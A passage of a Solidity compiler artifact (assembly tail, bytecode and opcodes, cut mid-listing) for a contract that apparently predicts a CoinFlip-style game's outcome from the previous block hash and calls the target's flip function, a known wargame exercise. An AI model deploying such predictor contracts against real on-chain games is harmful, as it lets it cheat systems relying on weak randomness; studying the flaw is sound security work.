jump\t// out\n        /* \"#utility.yul\":10062:10481   */\n    tag_58:\n        /* \"#utility.yul\":10228:10232   */\n      0x00\n        /* \"#utility.yul\":10266:10268   */\n      0x20\n        /* \"#utility.yul\":10255:10264   */\n      dup3\n        /* \"#utility.yul\":10251:10269   */\n      add\n        /* \"#utility.yul\":10243:10269   */\n      swap1\n      pop\n        /* \"#utility.yul\":10315:10324   */\n      dup2\n        /* \"#utility.yul\":10309:10313   */\n      dup2\n        /* \"#utility.yul\":10305:10325   */\n      sub\n        /* \"#utility.yul\":10301:10302   */\n      0x00\n        /* \"#utility.yul\":10290:10299   */\n      dup4\n        /* \"#utility.yul\":10286:10303   */\n      add\n        /* \"#utility.yul\":10279:10326   */\n      mstore\n        /* \"#utility.yul\":10343:10474   */\n      tag_210\n        /* \"#utility.yul\":10469:10473   */\n      dup2\n        /* \"#utility.yul\":10343:10474   */\n      tag_100\n      jump\t// in\n    tag_210:\n        /* \"#utility.yul\":10335:10474   */\n      swap1\n      pop\n        /* \"#utility.yul\":10062:10481   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10487:10650   */\n    tag_101:\n        /* \"#utility.yul\":10627:10642   */\n      0x426c6f636b20746f6f206f6c6400000000000000000000000000000000000000\n        /* \"#utility.yul\":10623:10624   */\n      0x00\n        /* \"#utility.yul\":10615:10621   */\n      dup3\n        /* \"#utility.yul\":10611:10625   */\n      add\n        /* \"#utility.yul\":10604:10643   */\n      mstore\n        /* \"#utility.yul\":10487:10650   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":10656:11022   */\n    tag_102:\n        /* \"#utility.yul\":10798:10801   */\n      0x00\n        /* \"#utility.yul\":10819:10886   */\n      tag_213\n        /* \"#utility.yul\":10883:10885   */\n      0x0d\n        /* \"#utility.yul\":10878:10881   */\n      dup4\n        /* \"#utility.yul\":10819:10886   */\n      tag_84\n      jump\t// in\n    tag_213:\n        /* \"#utility.yul\":10812:10886   */\n      swap2\n      pop\n        /* \"#utility.yul\":10895:10988   */\n      tag_214\n        /* \"#utility.yul\":10984:10987   */\n      dup3\n        /* \"#utility.yul\":10895:10988   */\n      tag_101\n      jump\t// in\n    tag_214:\n        /* \"#utility.yul\":11013:11015   */\n      0x20\n        /* \"#utility.yul\":11008:11011   */\n      dup3\n        /* \"#utility.yul\":11004:11016   */\n      add\n        /* \"#utility.yul\":10997:11016   */\n      swap1\n      pop\n        /* \"#utility.yul\":10656:11022   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":11028:11447   */\n    tag_66:\n        /* \"#utility.yul\":11194:11198   */\n      0x00\n        /* \"#utility.yul\":11232:11234   */\n      0x20\n        /* \"#utility.yul\":11221:11230   */\n      dup3\n        /* \"#utility.yul\":11217:11235   */\n      add\n        /* \"#utility.yul\":11209:11235   */\n      swap1\n      pop\n        /* \"#utility.yul\":11281:11290   */\n      dup2\n        /* \"#utility.yul\":11275:11279   */\n      dup2\n        /* \"#utility.yul\":11271:11291   */\n      sub\n        /* \"#utility.yul\":11267:11268   */\n      0x00\n        /* \"#utility.yul\":11256:11265   */\n      dup4\n        /* \"#utility.yul\":11252:11269   */\n      add\n        /* \"#utility.yul\":11245:11292   */\n      mstore\n        /* \"#utility.yul\":11309:11440   */\n      tag_216\n        /* \"#utility.yul\":11435:11439   */\n      dup2\n        /* \"#utility.yul\":11309:11440   */\n      tag_102\n      jump\t// in\n    tag_216:\n        /* \"#utility.yul\":11301:11440   */\n      swap1\n      pop\n        /* \"#utility.yul\":11028:11447   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c452346b2ac790d3b69e8bbec9108a818cd6db57ba0877e7336e31603956ea0764736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b50604051610c86380380610c86833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b610b7a8061010c5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80635ac947cb1461004e5780639fbe138c1461006c578063cde4efa91461008a578063e4629f34146100a8575b5f5ffd5b6100566100c6565b60405161006391906105a2565b60405180910390f35b6100746100ea565b60405161008191906105d3565b60405180910390f35b61009261017d565b60405161009f9190610606565b60405180910390f35b6100b0610498565b6040516100bd9190610606565b60405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e6f334d76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610154573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101789190610656565b905090565b5f5f60014361018c91906106ae565b405f1c90505f8103610208577f08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa6040516101c590610761565b60405180910390a16040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ff906107c9565b60405180910390fd5b5f7f8000000000000000000000000000000000000000000000000000000000000000826102359190610814565b90505f6001821490507f11ddb8644767a7bfc5e1732b826a3dd711ba311485f89f32dc48050b4ef3be785f8243866040516102739493929190610844565b60405180910390a15f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016102d49190610606565b6020604051808303815f875af192505050801561030f57506040513d601f19601f8201168201806040525081019061030c91906108b1565b60015b6104505761031b6108e8565b806308c379a0036103ae575061032f610975565b8061033a57506103b0565b7f08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa816040516103699190610a54565b60405180910390a1806040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103a59190610a54565b60405180910390fd5b505b3d805f81146103da576040519150601f19603f3d011682016040523d82523d5f602084013e6103df565b606091505b507f08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa60405161040d90610abe565b60405180910390a16040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161044790610abe565b60405180910390fd5b7f11ddb8644767a7bfc5e1732b826a3dd711ba311485f89f32dc48050b4ef3be7860018243876040516104869493929190610844565b60405180910390a18094505050505090565b5f5f6001436104a791906106ae565b405f1c90505f81036104ee576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e590610b26565b60405180910390fd5b5f7f80000000000000000000000000000000000000000000000000000000000000008261051b9190610814565b9050600181149250505090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61056a61056561056084610528565b610547565b610528565b9050919050565b5f61057b82610550565b9050919050565b5f61058c82610571565b9050919050565b61059c81610582565b82525050565b5f6020820190506105b55f830184610593565b92915050565b5f819050919050565b6105cd816105bb565b82525050565b5f6020820190506105e65f8301846105c4565b92915050565b5f8115159050919050565b610600816105ec565b82525050565b5f6020820190506106195f8301846105f7565b92915050565b5f604051905090565b5f5ffd5b610635816105bb565b811461063f575f5ffd5b50565b5f815190506106508161062c565b92915050565b5f6020828403121561066b5761066a610628565b5b5f61067884828501610642565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6106b8826105bb565b91506106c3836105bb565b92508282039050818111156106db576106da610681565b5b92915050565b5f82825260208201905092915050565b7f626c6f636b686173682072657475726e65642030202d20626c6f636b20746f6f5f8201527f206f6c6400000000000000000000000000000000000000000000000000000000602082015250565b5f61074b6024836106e1565b9150610756826106f1565b604082019050919050565b5f6020820190508181035f8301526107788161073f565b9050919050565b7f626c6f636b68617368206973207a65726f0000000000000000000000000000005f82015250565b5f6107b36011836106e1565b91506107be8261077f565b602082019050919050565b5f6020820190508181035f8301526107e0816107a7565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61081e826105bb565b9150610829836105bb565b925082610839576108386107e7565b5b828204905092915050565b5f6080820190506108575f8301876105f7565b61086460208301866105f7565b61087160408301856105c4565b61087e60608301846105c4565b95945050505050565b610890816105ec565b811461089a575f5ffd5b50565b5f815190506108ab81610887565b92915050565b5f602082840312156108c6576108c5610628565b5b5f6108d38482850161089d565b91505092915050565b5f8160e01c9050919050565b5f60033d11156109045760045f5f3e6109015f516108dc565b90505b90565b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61094d82610907565b810181811067ffffffffffffffff8211171561096c5761096b610917565b5b80604052505050565b5f60443d10610a015761098661061f565b60043d036004823e80513d602482011167ffffffffffffffff821117156109ae575050610a01565b808201805167ffffffffffffffff8111156109cc5750505050610a01565b80602083010160043d0385018111156109e9575050505050610a01565b6109f882602001850186610944565b82955050505050505b90565b5f81519050919050565b8281835e5f83830152505050565b5f610a2682610a04565b610a3081856106e1565b9350610a40818560208601610a0e565b610a4981610907565b840191505092915050565b5f6020820190508181035f830152610a6c8184610a1c565b905092915050565b7f556e6b6e6f776e206572726f72000000000000000000000000000000000000005f82015250565b5f610aa8600d836106e1565b9150610ab382610a74565b602082019050919050565b5f6020820190508181035f830152610ad581610a9c565b9050919050565b7f426c6f636b20746f6f206f6c64000000000000000000000000000000000000005f82015250565b5f610b10600d836106e1565b9150610b1b82610adc565b602082019050919050565b5f6020820190508181035f830152610b3d81610b04565b905091905056fea2646970667358221220c452346b2ac790d3b69e8bbec9108a818cd6db57ba0877e7336e31603956ea0764736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xC86 CODESIZE SUB DUP1 PUSH2 0xC86 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xB7A DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4A JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5AC947CB EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x9FBE138C EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x8A JUMPI DUP1 PUSH4 0xE4629F34 EQ PUSH2 0xA8 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x56 PUSH2 0xC6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x5A2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x74 PUSH2 0xEA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x81 SWAP2 SWAP1 PUSH2 0x5D3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x92 PUSH2 0x17D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x9F SWAP2 SWAP1 PUSH2 0x606 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB0 PUSH2 0x498 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xBD SWAP2 SWAP1 PUSH2 0x606 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE6F334D7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x154 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x178 SWAP2 SWAP1 PUSH2 0x656 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x18C SWAP2 SWAP1 PUSH2 0x6AE JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP2 SUB PUSH2 0x208 JUMPI PUSH32 0x8C379A0AFCC32B1A39302F7CB8073359698411AB5FD6E3EDB2C02C0B5FBA8AA PUSH1 0x40 MLOAD PUSH2 0x1C5 SWAP1 PUSH2 0x761 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1FF SWAP1 PUSH2 0x7C9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x235 SWAP2 SWAP1 PUSH2 0x814 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ SWAP1 POP PUSH32 0x11DDB8644767A7BFC5E1732B826A3DD711BA311485F89F32DC48050B4EF3BE78 PUSH0 DUP3 NUMBER DUP7 PUSH1 0x40 MLOAD PUSH2 0x273 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x844 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2D4 SWAP2 SWAP1 PUSH2 0x606 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x30F JUMPI POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x30C SWAP2 SWAP1 PUSH2 0x8B1 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH2 0x450 JUMPI PUSH2 0x31B PUSH2 0x8E8 JUMP JUMPDEST DUP1 PUSH4 0x8C379A0 SUB PUSH2 0x3AE JUMPI POP PUSH2 0x32F PUSH2 0x975 JUMP JUMPDEST DUP1 PUSH2 0x33A JUMPI POP PUSH2 0x3B0 JUMP JUMPDEST PUSH32 0x8C379A0AFCC32B1A39302F7CB8073359698411AB5FD6E3EDB2C02C0B5FBA8AA DUP2 PUSH1 0x40 MLOAD PUSH2 0x369 SWAP2 SWAP1 PUSH2 0xA54 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3A5 SWAP2 SWAP1 PUSH2 0xA54 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMPDEST RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x3DA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3DF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP PUSH32 0x8C379A0AFCC32B1A39302F7CB8073359698411AB5FD6E3EDB2C02C0B5FBA8AA PUSH1 0x40 MLOAD PUSH2 0x40D SWAP1 PUSH2 0xABE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x447 SWAP1 PUSH2 0xABE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x11DDB8644767A7BFC5E1732B826A3DD711BA311485F89F32DC48050B4EF3BE78 PUSH1 0x1 DUP3 NUMBER DUP8 PUSH1 0x40 MLOAD PUSH2 0x486 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x844 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x4A7 SWAP2 SWAP1 PUSH2 0x6AE JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP2 SUB PUSH2 0x4EE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4E5 SWAP1 PUSH2 0xB26 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x51B SWAP2 SWAP1 PUSH2 0x814 JUMP JUMPDEST SWAP1 POP PUSH1 0x1 DUP2 EQ SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x56A PUSH2 0x565 PUSH2 0x560 DUP5 PUSH2 0x528 JUMP JUMPDEST PUSH2 0x547 JUMP JUMPDEST PUSH2 0x528 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x57B DUP3 PUSH2 0x550 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x58C DUP3 PUSH2 0x571 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x59C DUP2 PUSH2 0x582 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5B5 PUSH0 DUP4 ADD DUP5 PUSH2 0x593 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5CD DUP2 PUSH2 0x5BB JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5E6 PUSH0 DUP4 ADD DUP5 PUSH2 0x5C4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x600 DUP2 PUSH2 0x5EC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x619 PUSH0 DUP4 ADD DUP5 PUSH2 0x5F7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x635 DUP2 PUSH2 0x5BB JUMP JUMPDEST DUP2 EQ PUSH2 0x63F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x650 DUP2 PUSH2 0x62C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x66B JUMPI PUSH2 0x66A PUSH2 0x628 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x678 DUP5 DUP3 DUP6 ADD PUSH2 0x642 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x6B8 DUP3 PUSH2 0x5BB JUMP JUMPDEST SWAP2 POP PUSH2 0x6C3 DUP4 PUSH2 0x5BB JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x6DB JUMPI PUSH2 0x6DA PUSH2 0x681 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x626C6F636B686173682072657475726E65642030202D20626C6F636B20746F6F PUSH0 DUP3 ADD MSTORE PUSH32 0x206F6C6400000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x74B PUSH1 0x24 DUP4 PUSH2 0x6E1 JUMP JUMPDEST SWAP2 POP PUSH2 0x756 DUP3 PUSH2 0x6F1 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x778 DUP2 PUSH2 0x73F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x626C6F636B68617368206973207A65726F000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x7B3 PUSH1 0x11 DUP4 PUSH2 0x6E1 JUMP JUMPDEST SWAP2 POP PUSH2 0x7BE DUP3 PUSH2 0x77F JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x7E0 DUP2 PUSH2 0x7A7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x81E DUP3 PUSH2 0x5BB JUMP JUMPDEST SWAP2 POP PUSH2 0x829 DUP4 PUSH2 0x5BB JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x839 JUMPI PUSH2 0x838 PUSH2 0x7E7 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x857 PUSH0 DUP4 ADD DUP8 PUSH2 0x5F7 JUMP JUMPDEST PUSH2 0x864 PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x5F7 JUMP JUMPDEST PUSH2 0x871 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x5C4 JUMP JUMPDEST PUSH2 0x87E PUSH1 0x60 DUP4 ADD DUP5 PUSH2 0x5C4 JUMP JUMPDEST SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH2 0x890 DUP2 PUSH2 0x5EC JUMP JUMPDEST DUP2 EQ PUSH2 0x89A JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x8AB DUP2 PUSH2 0x887 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x8C6 JUMPI PUSH2 0x8C5 PUSH2 0x628 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x8D3 DUP5 DUP3 DUP6 ADD PUSH2 0x89D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xE0 SHR SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x3 RETURNDATASIZE GT ISZERO PUSH2 0x904 JUMPI PUSH1 0x4 PUSH0 PUSH0 RETURNDATACOPY PUSH2 0x901 PUSH0 MLOAD PUSH2 0x8DC JUMP JUMPDEST SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH2 0x94D DUP3 PUSH2 0x907 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x96C JUMPI PUSH2 0x96B PUSH2 0x917 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x44 RETURNDATASIZE LT PUSH2 0xA01 JUMPI PUSH2 0x986 PUSH2 0x61F JUMP JUMPDEST PUSH1 0x4 RETURNDATASIZE SUB PUSH1 0x4 DUP3 RETURNDATACOPY DUP1 MLOAD RETURNDATASIZE PUSH1 0x24 DUP3 ADD GT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x9AE JUMPI POP POP PUSH2 0xA01 JUMP JUMPDEST DUP1 DUP3 ADD DUP1 MLOAD PUSH8 